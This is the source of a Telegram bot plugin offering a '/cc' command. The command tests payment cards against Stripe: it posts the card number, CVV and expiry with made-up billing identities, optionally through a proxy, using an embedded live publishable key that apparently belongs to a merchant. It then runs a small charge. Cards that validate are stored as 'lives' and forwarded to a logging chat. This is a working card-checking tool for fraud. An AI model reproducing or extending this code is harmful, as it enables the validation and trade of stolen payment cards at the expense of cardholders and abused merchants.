"""
≛ <b>Commands Available</b> ≛
──────────────────────
- <code>/cc</code> cc cvv mes ano || <reply_to_msg>
➛ Stripe Charge $0.1
──────────────────────

©<a href="https://t.me/roldexverse">RoldexVerse</a>
"""


import os
import re
import time
import requests
from mills import LOG_CHAT

from mills.decorators import bot_cmd
from mills.func.tools import web_search
from mills.plugins.checkers.utils.gateinfo import get_gate_info
from mills.plugins import rand_user_base
from mills.plugins.checkers.utils.getcards  import get_cards
from mills.plugins._helpers.strings import get_strings
from mills.plugins.checkers.funcs.cc_defs import cc_one



@bot_cmd(cmd="cc", text_only = True)
@get_gate_info("cc")
@get_cards()
@get_strings("card_chk")
async def _at(m, gate_db, user_db, cards, lang):
    start_time = int(time.time())
    cc,mes,ano,cvv, bin_info = cards
    message = await m.reply(lang['fir_msg'].format(
        gate_name = gate_db['gate_name'],
        name = m.full_name(),
        id = m.sender_id,
        taken = int(time.time()) - start_time,
    ))
    r = requests.Session()
    rand_user = rand_user_base.rand_user()
    if proxy:= await m.adb.get_key('use_proxy'):
        r.proxies = {'http': proxy, 'https': proxy}
    e_json = {
    'type': 'card',
    'billing_details[name]': rand_user['name'],
    'billing_details[email]': rand_user['email'],
    'billing_details[address][line1]': rand_user['street'],
    'billing_details[address][city]': rand_user['city'],
    'billing_details[address][state]': rand_user['state'],
    'billing_details[address][country]': 'US',
    'billing_details[address][postal_code]': rand_user['zip'],
    'card[number]': cc,
    'card[cvc]': cvv,
    'card[exp_month]': mes,
    'card[exp_year]': ano,
    'payment_user_agent': 'stripe.js/5b44f0773; stripe-js-v3/5b44f0773',
    'time_on_page': '251790',
    'key': 'pk_live_jkXVN9X5WdXXmb9W8A7uzE4P00oMxJsQbK',
}
    first = requests.post('https://api.stripe.com/v1/payment_methods', data = e_json)
    json_first = first.json()
    if 'error' in json_first:
        messa = json_first['error']['decline_code'].replace('_', ' ') if 'decline_code' in json_first['error'] else json_first['error']['code'].replace('_', ' ')
        await message.edit(lang['fin_msg'].format(
            gate_name = gate_db['gate_name'],
            card = f"{cc}|{mes}|{ano}|{cvv}",
            logo = "❌",
            status = json_first['error']['code'].replace('_', ' ').title(),
            message = messa,
            vendor = bin_info['vendor'],
            type = bin_info['type'],
            bank_name = bin_info['bank_name'],
            country = bin_info['iso'],
            flag = bin_info['flag'],
            name = m.full_name(),
            id = m.sender_id,
            role = user_db['role'],
            taken = int(time.time()) - start_time,
        ))
        return
    a = cc_one(r,json_first['id'], rand_user['email'])
    if not a:
        return await message.edit("Error while checking your card. trying again....")
    r_respo, r_logo, r_text = a
    await message.edit(lang['fin_msg'].format(
        gate_name = gate_db['gate_name'],
        card = f"{cc}|{mes}|{ano}|{cvv}",
        status = r_text,
        logo = r_logo,
        message = r_respo ,
        vendor = bin_info['vendor'],
        type = bin_info['type'],
        bank_name = bin_info['bank_name'],
        country = bin_info['iso'],
        flag = bin_info['flag'],
        name = m.full_name(),
        id = m.sender_id,
        role = user_db['role'],
        taken = int(time.time()) - start_time,
    ), link_preview = False)
    if r_respo == "CVV MATCH":
        if user_db['saveccs']:
            await m.mdb.update_one('users',{'_id': m.sender_id}, {'$addToSet': {'lives': f"{cc}|{mes}|{ano}|{cvv} - {r_text} - {gate_db['gate_name']}"}})
        m.save_lives(f"{cc}|{mes}|{ano}|{cvv} - {r_text} - {gate_db['gate_name']}")
        await m.client.send_message(LOG_CHAT, f"{cc}|{mes}|{ano}|{cvv} - {r_text} - {gate_db['gate_name']}")
    await m.adb.set_key(f'antispam_{str(m.sender_id)}', time.time())
    return